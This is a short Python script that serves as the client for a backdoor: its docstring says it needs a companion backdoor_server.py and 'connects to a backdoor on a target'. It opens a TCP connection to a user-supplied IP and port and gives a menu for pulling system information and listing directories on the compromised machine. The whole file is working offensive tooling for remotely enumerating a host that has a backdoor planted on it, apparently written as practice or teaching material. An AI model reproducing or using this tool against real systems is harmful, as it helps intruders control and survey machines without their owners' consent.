import socket, platform, os 

"""
- requires backdoor_server.py
- connects to a backdoor on a target 
- provides a list of enumeration options for a user to perform on target
"""

srv_addr = input('Type the server IP address: ')
srv_port = int(input('Type the server port: '))

def print_menu():
    print("""
    0) Close the connection 
    1) Get system info.
    2) List directory contents"""
    )


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((srv_addr, srv_port))

print('connection established')

print_menu()

while 1:
    msg = input('\n ___ select an option: ')

    if (msg == '0'):
        s.sendall(msg.encode())
        s.close()
        break
    elif (msg == '1'):
        s.sendall(msg.encode())
        data = s.recv(1024)
        if not data: break 
        print(data.decode('utf-8'))
    elif (msg == '2'):
        path = input('Enter path: ')
        s.sendall(msg.encode())
        s.sendall(path.encode())
        data = s.recv(1024)
        data = data.decode('utf-8').split(',')
        print('*' * 40)
        for i in data: 
            print(i)
        print('*' * 40)

    print_menu()
